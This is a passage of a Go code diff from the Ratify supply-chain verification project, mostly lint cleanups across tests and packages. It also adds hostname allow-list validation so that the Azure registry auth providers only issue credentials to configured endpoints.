func(artifactType string) bool {\n+\t\t\tVerifyResult: func(_ string) bool {\n \t\t\t\treturn true\n \t\t\t},\n \t\t}\n\n@@ -552,7 +552,7 @@\nfunc TestServer_Verify_PolicyEnforcerConfigInvalid_Failure(t *testing.T) {\n \t\t\tCanVerifyFunc: func(at string) bool {\n \t\t\t\treturn at == testArtifactType\n \t\t\t},\n-\t\t\tVerifyResult: func(artifactType string) bool {\n+\t\t\tVerifyResult: func(_ string) bool {\n \t\t\t\ttime.Sleep(time.Duration(timeoutDuration) * time.Second)\n \t\t\t\treturn true\n \t\t\t},\n\n@@ -671,7 +671,7 @@\nfunc TestServer_Verify_VerifierConfigInvalid_Failure(t *testing.T) {\n // TestServe_serverGracefulShutdown tests the case where the server is shutdown gracefully\n func TestServer_serverGracefulShutdown(t *testing.T) {\n \t// create a server that sleeps for 5 seconds before responding\n-\tts := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n+\tts := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {\n \t\ttime.Sleep(5 * time.Second)\n \t\tfmt.Fprintln(w, \"request succeeded\")\n \t}))\n```\n\nFilename: httpserver/tlsManager.go:\n```\n@@ -73,7 +73,7 @@\nfunc (t *TLSCertWatcher) Start() error {\n \t\tvar watchErr error\n \t\tpollInterval := 1 * time.Second\n \t\tpollTimeout := 10 * time.Second\n-\t\tif err := wait.PollUntilContextTimeout(context.TODO(), pollInterval, pollTimeout, false, func(ctx context.Context) (done bool, err error) {\n+\t\tif err := wait.PollUntilContextTimeout(context.TODO(), pollInterval, pollTimeout, false, func(_ context.Context) (done bool, err error) {\n \t\t\tfor f := range files {\n \t\t\t\tif err := t.watcher.Add(f); err != nil {\n \t\t\t\t\twatchErr = err\n```\n\nFilename: pkg/certificateprovider/certificate_provider_test.go:\n```\n@@ -78,7 +78,7 @@\nfunc TestDecodeCertificates_ByteArrayToCertificates(t *testing.T) {\n \n \tr, err := DecodeCertificates(c1)\n \tif err != nil {\n-\t\tt.Fatalf(err.Error())\n+\t\tt.Fatal(err.Error())\n \t}\n \n \texpectedLen := 1\n```\n\nFilename: pkg/common/oras/authprovider/aws/awsecrbasic.go:\n```\n@@ -70,7 +70,7 @@\nfunc (d *awsEcrBasicAuthProvider) getEcrAuthToken(artifact string) (EcrAuthToken\n \tctx := context.Background()\n \t// TODO: Update to use regional endpoint\n \t// nolint:staticcheck\n-\tresolver := aws.EndpointResolverWithOptionsFunc(func(service, region string, options ...interface{}) (aws.Endpoint, error) {\n+\tresolver := aws.EndpointResolverWithOptionsFunc(func(service, region string, _ ...interface{}) (aws.Endpoint, error) {\n \t\tif service == ecr.ServiceID && region == apiOverrideRegion {\n \t\t\tlogrus.Info(\"AWS ECR basic auth using custom endpoint resolver...\")\n \t\t\tlogrus.Infof(\"AWS ECR basic auth API override endpoint: %s\", apiOverrideEndpoint)\n```\n\nFilename: pkg/common/oras/authprovider/azure/azureidentity.go:\n```\n@@ -37,11 +37,13 @@\ntype azureManagedIdentityAuthProvider struct {\n \tidentityToken azcore.AccessToken\n \tclientID      string\n \ttenantID      string\n+\tendpoints     []string\n }\n \n type azureManagedIdentityAuthProviderConf struct {\n-\tName     string `json:\"name\"`\n-\tClientID string `json:\"clientID\"`\n+\tName      string   `json:\"name\"`\n+\tClientID  string   `json:\"clientID\"`\n+\tEndpoints []string `json:\"endpoints,omitempty\"`\n }\n \n const (\n\n@@ -76,9 +78,12 @@\nfunc (s *azureManagedIdentityProviderFactory) Create(authProviderConfig provider\n \t\t\treturn nil, re.ErrorCodeEnvNotSet.WithDetail(\"AZURE_CLIENT_ID environment variable is empty\").WithComponentType(re.AuthProvider)\n \t\t}\n \t}\n+\n+\tendpoints, err := parseEndpoints(conf.Endpoints)\n \tif err != nil {\n-\t\treturn nil, err\n+\t\treturn nil, re.ErrorCodeConfigInvalid.WithError(err)\n \t}\n+\n \t// retrieve an AAD Access token\n \ttoken, err := getManagedIdentityToken(context.Background(), client)\n \tif err != nil {\n\n@@ -89,6 +94,7 @@\nfunc (s *azureManagedIdentityProviderFactory) Create(authProviderConfig provider\n \t\tidentityToken: token,\n \t\tclientID:      client,\n \t\ttenantID:      tenant,\n+\t\tendpoints:     endpoints,\n \t}, nil\n }\n\n@@ -122,6 +128,10 @@\nfunc (d *azureManagedIdentityAuthProvider) Provide(ctx context.Context, artifact\n \t\treturn provider.AuthConfig{}, err\n \t}\n \n+\tif err := validateHost(artifactHostName, d.endpoints); err != nil {\n+\t\treturn provider.AuthConfig{}, re.ErrorCodeHostNameInvalid.WithError(err)\n+\t}\n+\n \t// need to refresh AAD token if it's expired\n \tif time.Now().Add(time.Minute * 5).After(d.identityToken.ExpiresOn) {\n \t\tnewToken, err := getManagedIdentityToken(ctx, d.clientID)\n```\n\nFilename: pkg/common/oras/authprovider/azure/azureworkloadidentity.go:\n```\n@@ -33,14 +33,16 @@\nimport (\n \n type AzureWIProviderFactory struct{} //nolint:revive // ignore linter to have unique type name\n type azureWIAuthProvider struct {\n-\taadToken confidential.AuthResult\n-\ttenantID string\n-\tclientID string\n+\taadToken  confidential.AuthResult\n+\ttenantID  string\n+\tclientID  string\n+\tendpoints []string\n }\n \n type azureWIAuthProviderConf struct {\n-\tName     string `json:\"name\"`\n-\tClientID string `json:\"clientID,omitempty\"`\n+\tName      string   `json:\"name\"`\n+\tClientID  string   `json:\"clientID,omitempty\"`\n+\tEndpoints []string `json:\"endpoints,omitempty\"`\n }\n \n const (\n\n@@ -77,16 +79,22 @@\nfunc (s *AzureWIProviderFactory) Create(authProviderConfig provider.AuthProvider\n \t\t}\n \t}\n \n+\tendpoints, err := parseEndpoints(conf.Endpoints)\n+\tif err != nil {\n+\t\treturn nil, re.ErrorCodeConfigInvalid.WithError(err)\n+\t}\n+\n \t// retrieve an AAD Access token\n \ttoken, err := azureauth.GetAADAccessToken(context.Background(), tenant, clientID, AADResource)\n \tif err != nil {\n \t\treturn nil, re.ErrorCodeAuthDenied.NewError(re.AuthProvider, \"\", re.AzureWorkloadIdentityLink, err, \"\", re.HideStackTrace)\n \t}\n \n \treturn &azureWIAuthProvider{\n-\t\taadToken: token,\n-\t\ttenantID: tenant,\n-\t\tclientID: clientID,\n+\t\taadToken:  token,\n+\t\ttenantID:  tenant,\n+\t\tclientID:  clientID,\n+\t\tendpoints: endpoints,\n \t}, nil\n }\n\n@@ -116,6 +124,10 @@\nfunc (d *azureWIAuthProvider) Provide(ctx context.Context, artifact string) (pro\n \t\treturn provider.AuthConfig{}, re.ErrorCodeHostNameInvalid.WithComponentType(re.AuthProvider)\n \t}\n \n+\tif err := validateHost(artifactHostName, d.endpoints); err != nil {\n+\t\treturn provider.AuthConfig{}, re.ErrorCodeHostNameInvalid.WithError(err)\n+\t}\n+\n \t// need to refresh AAD token if it's expired\n \tif time.Now().Add(time.Minute * 5).After(d.aadToken.ExpiresOn) {\n \t\tnewToken, err := azureauth.GetAADAccessToken(ctx, d.tenantID, d.clientID, AADResource)\n```\n\nFilename: pkg/common/oras/authprovider/azure/const.go:\n```\n@@ -27,6 +27,9 @@\nconst (\n \tdefaultACRExpiryDuration     time.Duration = 3 * time.Hour\n )\n \n-var logOpt = logger.Option{\n-\tComponentType: logger.AuthProvider,\n-}\n+var (\n+\tlogOpt = logger.Option{\n+\t\tComponentType: logger.AuthProvider,\n+\t}\n+\tdefaultACREndpoints = []string{\"*.azurecr.io\", \"*.azurecr.us\", \"*.azurecr.cn\"}\n+)\n```\n\nFilename: pkg/common/oras/authprovider/azure/helper.go:\n```\n@@ -0,0 +1,72 @@\n+/*\n+Copyright The Ratify Authors.\n+Licensed under the Apache License, Version 2.0 (the \"License\");\n+you may not use this file except in compliance with the License.\n+You may obtain a copy of the License at\n+\n+http://www.apache.org/licenses/LICENSE-2.0\n+\n+Unless required by applicable law or agreed to in writing, software\n+distributed under the License is distributed on an \"AS IS\" BASIS,\n+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+See the License for the specific language governing permissions and\n+limitations under the License.\n+*/\n+\n+package azure\n+\n+import (\n+\t\"fmt\"\n+\t\"strings\"\n+)\n+\n+// parseEndpoints checks if the endpoints are valid for auth provider. If no\n+// endpoints are provided, it defaults to the default ACR endpoint.\n+// A valid endpoint is either a fully qualified domain name or a wildcard domain\n+// name folloiwing RFC 1034.\n+// Valid examples:\n+// - *.example.com\n+// - example.com\n+//\n+// Invalid examples:\n+// - *\n+// - example.*\n+// - *example.com.*\n+// - *.\n+func parseEndpoints(endpoints []string) ([]string, error) {\n+\tif len(endpoints) == 0 {\n+\t\treturn defaultACREndpoints, nil\n+\t}\n+\tfor _, endpoint := range endpoints {\n+\t\tswitch strings.Count(endpoint, \"*\") {\n+\t\tcase 0:\n+\t\t\tcontinue\n+\t\tcase 1:\n+\t\t\tif !strings.HasPrefix(endpoint, \"*.\") {\n+\t\t\t\treturn nil, fmt.Errorf(\"invalid wildcard domain name: %s, it must start with '*.'\", endpoint)\n+\t\t\t}\n+\t\t\tif len(endpoint) < 3 {\n+\t\t\t\treturn nil, fmt.Errorf(\"invalid wildcard domain name: %s, it must have at least one character after '*.'\", endpoint)\n+\t\t\t}\n+\t\tdefault:\n+\t\t\treturn nil, fmt.Errorf(\"invalid wildcard domain name: %s, it must have at most one wildcard character\", endpoint)\n+\t\t}\n+\t}\n+\treturn endpoints, nil\n+}\n+\n+// validateHost checks if the host is matching endpoints supported by the auth\n+// provider.\n+func validateHost(host string, endpoints []string) error {\n+\tfor _, endpoint := range endpoints {\n+\t\tif endpoint[0] == '*' {\n+\t\t\tif _, zone, ok := strings.Cut(host, \".\"); ok && zone == endpoint[2:] {\n+\t\t\t\treturn nil\n+\t\t\t}\n+\t\t}\n+\t\tif host == endpoint {\n+\t\t\treturn nil\n+\t\t}\n+\t}\n+\treturn fmt.Errorf(\"the artifact host %s is not in the scope of the store auth provider\", host)\n+}\n```\n\nFilename: pkg/common/oras/authprovider/azure/helper_test.go:\n```\n@@ -0,0 +1,110 @@\n+/*\n+Copyright The Ratify Authors.\n+Licensed under the Apache License, Version 2.0 (the \"License\");\n+you may not use this file except in compliance with the License.\n+You may obtain a copy of the License at\n+\n+http://www.apache.org/licenses/LICENSE-2.0\n+\n+Unless required by applicable law or agreed to in writing, software\n+distributed under the License is distributed on an \"AS IS\" BASIS,\n+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+See the License for the specific language governing permissions and\n+limitations under the License.\n+*/\n+\n+package azure\n+\n+import (\n+\t\"testing\"\n+)\n+\n+func TestValidateEndpoints(t *testing.T) {\n+\ttests := []struct {\n+\t\tname        string\n+\t\tendpoint    string\n+\t\texpectedErr bool\n+\t}{\n+\t\t{\n+\t\t\tname:        \"global wildcard\",\n+\t\t\tendpoint:    \"*\",\n+\t\t\texpectedErr: true,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"multiple wildcard\",\n+\t\t\tendpoint:    \"*.example.*\",\n+\t\t\texpectedErr: true,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"no subdomain\",\n+\t\t\tendpoint:    \"*.\",\n+\t\t\texpectedErr: true,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"full qualified domain\",\n+\t\t\tendpoint:    \"example.com\",\n+\t\t\texpectedErr: false,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"valid wildcard domain\",\n+\t\t\tendpoint:    \"*.example.com\",\n+\t\t\texpectedErr: false,\n+\t\t},\n+\t}\n+\n+\tfor _, tt := range tests {\n+\t\tt.Run(tt.name, func(t *testing.T) {\n+\t\t\t_, err := parseEndpoints([]string{tt.endpoint})\n+\t\t\tif tt.expectedErr != (err != nil) {\n+\t\t\t\tt.Fatalf(\"expected error: %v, got error: %v\", tt.expectedErr, err)\n+\t\t\t}\n+\t\t})\n+\t}\n+}\n+\n+func TestValidateHost(t *testing.T) {\n+\tendpoints := []string{\n+\t\t\"*.azurecr.io\",\n+\t\t\"example.azurecr.io\",\n+\t}\n+\ttests := []struct {\n+\t\tname        string\n+\t\thost        string\n+\t\texpectedErr bool\n+\t}{\n+\t\t{\n+\t\t\tname:        \"empty host\",\n+\t\t\thost:        \"\",\n+\t\t\texpectedErr: true,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"valid host\",\n+\t\t\thost:        \"example.azurecr.io\",\n+\t\t\texpectedErr: false,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"no subdomain\",\n+\t\t\thost:        \"azurecr.io\",\n+\t\t\texpectedErr: true,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"multiple subdomains\",\n+\t\t\thost:        \"example.test.azurecr.io\",\n+\t\t\texpectedErr: true,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"matched host\",\n+\t\t\thost:        \"test.azurecr.io\",\n+\t\t\texpectedErr: false,\n+\t\t},\n+\t}\n+\n+\tfor _, tt := range tests {\n+\t\tt.Run(tt.name, func(t *testing.T) {\n+\t\t\terr := validateHost(tt.host, endpoints)\n+\t\t\tif tt.expectedErr != (err != nil) {\n+\t\t\t\tt.Fatalf(\"expected error: %v, got error: %v\", tt.expectedErr, err)\n+\t\t\t}\n+\t\t})\n+\t}\n+}\n```\n\nFilename: pkg/controllers/clusterresource/policy_controller_test.go:\n```\n@@ -109,7 +109,7 @@\nfunc TestWritePolicyStatus(t *testing.T) {\n \t}\n \n \tfor _, tc := range testCases {\n-\t\tt.Run(tc.name, func(t *testing.T) {\n+\t\tt.Run(tc.name, func(_ *testing.T) {\n \t\t\twritePolicyStatus(context.Background(), tc.reconciler, tc.policy, logger, tc.isSuccess, tc.errString)\n \t\t})\n \t}\n```\n\nFilename: pkg/controllers/clusterresource/store_controller_test.go:\n```\n@@ -119,7 +119,7 @@\nfunc TestWriteStoreStatus(t *testing.T) {\n \t}\n \n \tfor _, tc := range testCases {\n-\t\tt.Run(tc.name, func(t *testing.T) {\n+\t\tt.Run(tc.name, func(_ *testing.T) {\n \t\t\twriteStoreStatus(context.Background(), tc.reconciler, tc.store, logger, tc.isSuccess, tc.errString)\n \t\t})\n \t}\n```\n\nFilename: pkg/controllers/logging.go:\n```\n@@ -122,7 +122,7 @@\nfunc (sink *LogrusSink) createEntry(keysAndValues ...interface{}) *logrus.Entry\n }\n \n func (sink *LogrusSink) formatMessage(msg string) string {\n-\tif sink.names == nil || len(sink.names) == 0 {\n+\tif len(sink.names) == 0 {\n \t\treturn msg\n \t}\n```\n\nFilename: pkg/controllers/namespaceresource/policy_controller_test.go:\n```\n@@ -137,7 +137,7 @@\nfunc TestWritePolicyStatus(t *testing.T) {\n \t}\n \n \tfor _, tc := range testCases {\n-\t\tt.Run(tc.name, func(t *testing.T) {\n+\t\tt.Run(tc.name, func(_ *testing.T) {\n \t\t\twritePolicyStatus(context.Background(), tc.reconciler, tc.policy, logger, tc.isSuccess, tc.errString)\n \t\t})\n \t}\n```\n\nFilename: pkg/executor/core/executor_test.go:\n```\n@@ -240,7 +240,7 @@\nfunc TestVerifySubjectInternal_CanVerify_ExpectedResults(t *testing.T) {\n \t\tCanVerifyFunc: func(at string) bool {\n \t\t\treturn at == testArtifactType1\n \t\t},\n-\t\tVerifyResult: func(artifactType string) bool {\n+\t\tVerifyResult: func(_ string) bool {\n \t\t\treturn true\n \t\t},\n \t}\n\n@@ -293,7 +293,7 @@\nfunc TestVerifySubjectInternal_VerifyFailures_ExpectedResults(t *testing.T) {\n \t\t},\n \t}\n \tver := &TestVerifier{\n-\t\tCanVerifyFunc: func(at string) bool {\n+\t\tCanVerifyFunc: func(_ string) bool {\n \t\t\treturn true\n \t\t},\n \t\tVerifyResult: func(artifactType string) bool {\n\n@@ -345,10 +345,10 @@\nfunc TestVerifySubjectInternal_VerifySuccess_ExpectedResults(t *testing.T) {\n \t\t},\n \t}\n \tver := &TestVerifier{\n-\t\tCanVerifyFunc: func(at string) bool {\n+\t\tCanVerifyFunc: func(_ string) bool {\n \t\t\treturn true\n \t\t},\n-\t\tVerifyResult: func(artifactType string) bool {\n+\t\tVerifyResult: func(_ string) bool {\n \t\t\treturn true\n \t\t},\n \t}\n\n@@ -402,7 +402,7 @@\nfunc TestVerifySubjectInternalWithDecision_MultipleArtifacts_ExpectedResults(t *\n \t\t},\n \t}\n \tver := &TestVerifier{\n-\t\tCanVerifyFunc: func(at string) bool {\n+\t\tCanVerifyFunc: func(_ string) bool {\n \t\t\treturn true\n \t\t},\n \t\tVerifyResult: func(artifactType string) bool {\n\n@@ -460,7 +460,7 @@\nfunc TestVerifySubjectInternal_NestedReferences_Expected(t *testing.T) {\n \t\tCanVerifyFunc: func(at string) bool {\n \t\t\treturn at == mocks.SbomArtifactType\n \t\t},\n-\t\tVerifyResult: func(artifactType string) bool {\n+\t\tVerifyResult: func(_ string) bool {\n \t\t\treturn true\n \t\t},\n \t\tnestedReferences: []string{\"string-content-does-not-matter\"},\n\n@@ -470,7 +470,7 @@\nfunc TestVerifySubjectInternal_NestedReferences_Expected(t *testing.T) {\n \t\tCanVerifyFunc: func(at string) bool {\n \t\t\treturn at == mocks.SignatureArtifactType\n \t\t},\n-\t\tVerifyResult: func(artifactType string) bool {\n+\t\tVerifyResult: func(_ string) bool {\n \t\t\treturn true\n \t\t},\n \t}\n\n@@ -538,7 +538,7 @@\nfunc TestVerifySubjectInternal_NoNestedReferences_Expected(t *testing.T) {\n \t\tCanVerifyFunc: func(at string) bool {\n \t\t\treturn at == mocks.SbomArtifactType\n \t\t},\n-\t\tVerifyResult: func(artifactType string) bool {\n+\t\tVerifyResult: func(_ string) bool {\n \t\t\treturn true\n \t\t},\n \t}\n\n@@ -547,7 +547,7 @@\nfunc TestVerifySubjectInternal_NoNestedReferences_Expected(t *testing.T) {\n \t\tCanVerifyFunc: func(at string) bool {\n \t\t\treturn at == mocks.SignatureArtifactType\n \t\t},\n-\t\tVerifyResult: func(artifactType string) bool {\n+\t\tVerifyResult: func(_ string) bool {\n \t\t\treturn true\n \t\t},\n \t}\n```\n\nFilename: pkg/keymanagementprovider/azurekeyvault/provider_test.go:\n```\n@@ -173,7 +173,7 @@\nfunc TestCreate(t *testing.T) {\n \t}\n \tfor _, tc := range testCases {\n \t\tt.Run(tc.name, func(t *testing.T) {\n-\t\t\tinitKVClient = func(ctx context.Context, keyVaultEndpoint, tenantID, clientID string) (*kv.BaseClient, error) {\n+\t\t\tinitKVClient = func(_ context.Context, _, _, _ string) (*kv.BaseClient, error) {\n \t\t\t\treturn &kv.BaseClient{}, nil\n \t\t\t}\n \t\t\t_, err := factory.Create(\"v1\", tc.config, \"\")\n\n@@ -224,7 +224,7 @@\nfunc TestGetKeys(t *testing.T) {\n \t\t},\n \t}\n \n-\tinitKVClient = func(ctx context.Context, keyVaultEndpoint, tenantID, clientID string) (*kv.BaseClient, error) {\n+\tinitKVClient = func(_ context.Context, _, _, _ string) (*kv.BaseClient, error) {\n \t\treturn &kv.BaseClient{}, nil\n \t}\n \tprovider, err := factory.Create(\"v1\", config, \"\")\n```\n\nFilename: pkg/keymanagementprovider/keymanagementprovider_test.go:\n```\n@@ -85,7 +85,7 @@\nfunc TestDecodeCertificates_ByteArrayToCertificates(t *testing.T) {\n \n \tr, err := DecodeCertificates(c1)\n \tif err != nil {\n-\t\tt.Fatalf(err.Error())\n+\t\tt.Fatal(err.Error())\n \t}\n \n \texpectedLen := 1\n```\n\nFilename: pkg/manager/manager.go:\n```\n@@ -105,7 +105,7 @@\nfunc StartServer(httpServerAddress, configFilePath, certDirectory, caCertFile st\n \t\tlogrus.Errorf(\"initialize server failed with error %v, exiting..\", err)\n \t\tos.Exit(1)\n \t}\n-\tlogrus.Infof(\"starting server at\" + httpServerAddress)\n+\tlogrus.Infof(\"starting server at: %s\", httpServerAddress)\n \tif err := server.Run(certRotatorReady); err != nil {\n \t\tlogrus.Errorf(\"starting server failed with error %v, exiting..\", err)\n \t\tos.Exit(1)\n```\n\nFilename: pkg/metrics/stats_reporter.go:\n```\n@@ -23,7 +23,6 @@\nimport (\n \tinstrument \"go.opentelemetry.io/otel/metric\"\n \t\"go.opentelemetry.io/otel/sdk/instrumentation\"\n \tsdkmetric \"go.opentelemetry.io/otel/sdk/metric\"\n-\t\"go.opentelemetry.io/otel/sdk/metric/aggregation\"\n )\n \n var (\n\n@@ -71,7 +70,7 @@\nfunc initStatsReporter() error {\n \t\t\t\tScope: instrumentation.Scope{Name: scope},\n \t\t\t},\n \t\t\tsdkmetric.Stream{\n-\t\t\t\tAggregation: aggregation.ExplicitBucketHistogram{\n+\t\t\t\tAggregation: sdkmetric.AggregationExplicitBucketHistogram{\n \t\t\t\t\tBoundaries: []float64{0, 10, 30, 50, 100, 200, 300, 400, 500, 600, 700, 800, 900, 1000, 1100, 1200, 1400, 1600, 1800, 2000, 2300, 2600, 4000, 4400, 4900},\n \t\t\t\t},\n \t\t\t},\n\n@@ -82,7 +81,7 @@\nfunc initStatsReporter() error {\n \t\t\t\tScope: instrumentation.Scope{Name: scope},\n \t\t\t},\n \t\t\tsdkmetric.Stream{\n-\t\t\t\tAggregation: aggregation.ExplicitBucketHistogram{\n+\t\t\t\tAggregation: sdkmetric.AggregationExplicitBucketHistogram{\n \t\t\t\t\tBoundaries: []float64{0, 10, 30, 50, 100, 200, 300, 400, 500, 600, 700, 800, 900, 1000, 1100, 1200, 1400, 1600, 1800},\n \t\t\t\t},\n \t\t\t},\n\n@@ -93,7 +92,7 @@\nfunc initStatsReporter() error {\n \t\t\t\tScope: instrumentation.Scope{Name: scope},\n \t\t\t},\n \t\t\tsdkmetric.Stream{\n-\t\t\t\tAggregation: aggregation.ExplicitBucketHistogram{\n+\t\t\t\tAggregation: sdkmetric.AggregationExplicitBucketHistogram{\n \t\t\t\t\tBoundaries: []float64{0, 10, 50, 100, 200, 300, 400, 600, 800, 1100, 1500, 2000},\n \t\t\t\t},\n \t\t\t},\n\n@@ -104,7 +103,7 @@\nfunc initStatsReporter() error {\n \t\t\t\tScope: instrumentation.Scope{Name: scope},\n \t\t\t},\n \t\t\tsdkmetric.Stream{\n-\t\t\t\tAggregation: aggregation.ExplicitBucketHistogram{\n+\t\t\t\tAggregation: sdkmetric.AggregationExplicitBucketHistogram{\n \t\t\t\t\tBoundaries: []float64{0, 10, 50, 100, 200, 300, 400, 500, 600, 700, 800, 900, 1000, 1200},\n \t\t\t\t},\n \t\t\t},\n\n@@ -115,7 +114,7 @@\nfunc initStatsReporter() error {\n \t\t\t\tScope: instrumentation.Scope{Name: scope},\n \t\t\t},\n \t\t\tsdkmetric.Stream{\n-\t\t\t\tAggregation: aggregation.ExplicitBucketHistogram{\n+\t\t\t\tAggregation: sdkmetric.AggregationExplicitBucketHistogram{\n \t\t\t\t\tBoundaries: []float64{0, 10, 50, 100, 200, 300, 400, 500, 600, 700, 800, 900, 1000, 1200},\n \t\t\t\t},\n \t\t\t},\n\n@@ -126,7 +125,7 @@\nfunc initStatsReporter() error {\n \t\t\t\tScope: instrumentation.Scope{Name: scope},\n \t\t\t},\n \t\t\tsdkmetric.Stream{\n-\t\t\t\tAggregation: aggregation.ExplicitBucketHistogram{\n+\t\t\t\tAggregation: sdkmetric.AggregationExplicitBucketHistogram{\n \t\t\t\t\tBoundaries: []float64{0, 10, 50, 100, 200, 300, 400, 500, 600, 700, 800, 900, 1000, 1200},\n \t\t\t\t},\n \t\t\t},\n```\n\nFilename: pkg/referrerstore/oras/oras.go:\n```\n@@ -183,7 +183,7 @@\nfunc createBaseStore(version string, storeConfig config.StorePluginConfig) (*ora\n \tinsecureTransport.MaxIdleConnsPerHost = HTTPMaxIdleConnsPerHost\n \t// #nosec G402\n \tinsecureTransport.TLSClientConfig = &tls.Config{\n-\t\tInsecureSkipVerify: true,\n+\t\tInsecureSkipVerify: true, //nolint:gosec\n \t}\n \tinsecureRetryTransport := retry.NewTransport(insecureTransport)\n \tinsecureRetryTransport.Policy = customRetryPolicy\n\n@@ -437,7 +437,7 @@\nfunc createDefaultRepository(ctx context.Context, store *orasStore, targetRef co\n \t}\n \n \t// set the provider to return the resolved credentials\n-\tcredentialProvider := func(ctx context.Context, registry string) (auth.Credential, error) {\n+\tcredentialProvider := func(_ context.Context, _ string) (auth.Credential, error) {\n \t\tif authConfig.Username != \"\" || authConfig.Password != \"\" || authConfig.IdentityToken != \"\" {\n \t\t\treturn auth.Credential{\n \t\t\t\tUsername:     authConfig.Username,\n```\n\nFilename: pkg/referrerstore/oras/oras_test.go:\n```\n@@ -101,7 +101,7 @@\nfunc TestORASListReferrers_SubjectDesc(t *testing.T) {\n \t\t\t},\n \t\t},\n \t}\n-\tstore.createRepository = func(ctx context.Context, store *orasStore, targetRef common.Reference) (registry.Repository, error) {\n+\tstore.createRepository = func(_ context.Context, _ *orasStore, _ common.Reference) (registry.Repository, error) {\n \t\treturn testRepo, nil\n \t}\n \tinputRef := common.Reference{\n\n@@ -158,7 +158,7 @@\nfunc TestORASListReferrers_NoSubjectDesc(t *testing.T) {\n \t\t\t},\n \t\t},\n \t}\n-\tstore.createRepository = func(ctx context.Context, store *orasStore, targetRef common.Reference) (registry.Repository, error) {\n+\tstore.createRepository = func(_ context.Context, _ *orasStore, _ common.Reference) (registry.Repository, error) {\n \t\treturn testRepo, nil\n \t}\n \tinputRef := common.Reference{\n\n@@ -226,7 +226,7 @@\nfunc TestORASGetReferenceManifest_CachedDesc(t *testing.T) {\n \t\t\tartifactDigest: io.NopCloser(bytes.NewReader(manifestNotCachedBytes)),\n \t\t},\n \t}\n-\tstore.createRepository = func(ctx context.Context, store *orasStore, targetRef common.Reference) (registry.Repository, error) {\n+\tstore.createRepository = func(_ context.Context, _ *orasStore, _ common.Reference) (registry.Repository, error) {\n \t\treturn testRepo, nil\n \t}\n \tstore.localCache = mocks.TestStorage{\n\n@@ -290,7 +290,7 @@\nfunc TestORASGetReferenceManifest_NotCachedDesc(t *testing.T) {\n \t\t\tartifactDigest: io.NopCloser(bytes.NewReader(manifestNotCachedBytes)),\n \t\t},\n \t}\n-\tstore.createRepository = func(ctx context.Context, store *orasStore, targetRef common.Reference) (registry.Repository, error) {\n+\tstore.createRepository = func(_ context.Context, _ *orasStore, _ common.Reference) (registry.Repository, error) {\n \t\treturn testRepo, nil\n \t}\n \tstore.localCache = mocks.TestStorage{\n\n@@ -346,7 +346,7 @@\nfunc TestORASGetBlobContent_CachedDesc(t *testing.T) {\n \t\t\t},\n \t\t},\n \t}\n-\tstore.createRepository = func(ctx context.Context, store *orasStore, targetRef common.Reference) (registry.Repository, error) {\n+\tstore.createRepository = func(_ context.Context, _ *orasStore, _ common.Reference) (registry.Repository, error) {\n \t\treturn testRepo, nil\n \t}\n \tstore.localCache = mocks.TestStorage{\n\n@@ -393,7 +393,7 @@\nfunc TestORASGetBlobContent_NotCachedDesc(t *testing.T) {\n \t\t\t},\n \t\t},\n \t}\n-\tstore.createRepository = func(ctx context.Context, store *orasStore, targetRef common.Reference) (registry.Repository, error) {\n+\tstore.createRepository = func(_ context.Context, _ *orasStore, _ common.Reference) (registry.Repository, error) {\n \t\treturn testRepo, nil\n \t}\n \tstore.localCache = mocks.TestStorage{\n```\n\nFilename: pkg/referrerstore/plugin/plugin_test.go:\n```\n@@ -46,10 +46,10 @@\nfunc (e *TestExecutor) FindInPaths(plugin string, paths []string) (string, error\n }\n func TestPluginMain_GetBlobContent_InvokeExpected(t *testing.T) {\n \ttestExecutor := &TestExecutor{\n-\t\tfind: func(plugin string, paths []string) (string, error) {\n+\t\tfind: func(_ string, _ []string) (string, error) {\n \t\t\treturn testPath, nil\n \t\t},\n-\t\texecute: func(ctx context.Context, pluginPath string, cmdArgs []string, stdinData []byte, environ []string) ([]byte, error) {\n+\t\texecute: func(_ context.Context, pluginPath string, cmdArgs []string, stdinData []byte, environ []string) ([]byte, error) {\n \t\t\tif pluginPath != testPath {\n \t\t\t\tt.Fatalf(\"mismatch in plugin path expected %s actual %s\", testPath, pluginPath)\n \t\t\t}\n\n@@ -124,10 +124,10 @@\nfunc TestPluginMain_GetBlobContent_InvokeExpected(t *testing.T) {\n \n func TestPluginMain_GetReferenceManifest_InvokeExpected(t *testing.T) {\n \ttestExecutor := &TestExecutor{\n-\t\tfind: func(plugin string, paths []string) (string, error) {\n+\t\tfind: func(_ string, _ []string) (string, error) {\n \t\t\treturn testPath, nil\n \t\t},\n-\t\texecute: func(ctx context.Context, pluginPath string, cmdArgs []string, stdinData []byte, environ []string) ([]byte, error) {\n+\t\texecute: func(_ context.Context, pluginPath string, cmdArgs []string, stdinData []byte, environ []string) ([]byte, error) {\n \t\t\tif pluginPath != testPath {\n \t\t\t\tt.Fatalf(\"mismatch in plugin path expected %s actual %s\", testPath, pluginPath)\n \t\t\t}\n\n@@ -207,10 +207,10 @@\nfunc TestPluginMain_GetReferenceManifest_InvokeExpected(t *testing.T) {\n func TestPluginMain_ListReferrers_InvokeExpected(t *testing.T) {\n \ttestPlugin := \"test-plugin\"\n \ttestExecutor := &TestExecutor{\n-\t\tfind: func(plugin string, paths []string) (string, error) {\n+\t\tfind: func(_ string, _ []string) (string, error) {\n \t\t\treturn testPath, nil\n \t\t},\n-\t\texecute: func(ctx context.Context, pluginPath string, cmdArgs []string, stdinData []byte, environ []string) ([]byte, error) {\n+\t\texecute: func(_ context.Context, pluginPath string, cmdArgs []string, stdinData []byte, environ []string) ([]byte, error) {\n \t\t\tif pluginPath != testPath {\n \t\t\t\tt.Fatalf(\"mismatch in plugin path expected %s actual %s\", testPath, pluginPath)\n \t\t\t}\n\n@@ -289,10 +289,10 @@\nfunc TestPluginMain_GetSubjectDescriptor_InvokeExpected(t *testing.T) {\n \ttestPlugin := \"test-plugin\"\n \ttestDigest := 